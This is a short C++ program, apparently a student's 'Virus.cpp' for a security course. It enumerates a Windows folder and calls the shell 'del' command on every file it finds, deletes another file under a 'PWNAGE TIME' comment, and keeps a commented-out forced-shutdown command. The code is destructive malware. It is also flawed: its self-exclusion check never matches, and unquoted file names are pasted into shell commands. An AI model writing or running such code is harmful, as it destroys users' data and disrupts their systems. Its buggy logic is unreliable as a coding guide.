#include <cstdlib>
#include <iostream>
#include <dirent.h>

using namespace std;

int main()
{
	DIR *dir;
	struct dirent *ent;
	char simpan[260][260];
	int i=0;
	
	if ((dir = opendir ("D:\\Masa Masa Kuliah\\Semester 6\\KIJ\\test")) != NULL) {
  		/* print all the files and directories within directory */
  		while ((ent = readdir (dir)) != NULL) {
    		printf ("%s\n", ent->d_name);
    		strcpy(simpan[i],ent->d_name);
    		i++;
  		}
  	closedir (dir);
	} else {
  		/* could not open directory */
  		perror ("");
  		return EXIT_FAILURE;
	}
	
	for(int j=0;j<i;j++)
	{
		if(j==0 || j==1) continue;
		if(simpan[j]=="Virus.cpp") continue;
		char command[200];    // 200 is just an example value that can hold the whole string
		sprintf(command, "del %s -q", simpan[j]);
		printf("%s",command);
		system(command);
	}
	
    system("del halo.txt -q"); //PWNAGE TIME
	//system("%SystemRoot%\\system32\\shutdown.exe -s -f -t 00");
	//system("PAUSE");
    return EXIT_SUCCESS;
}

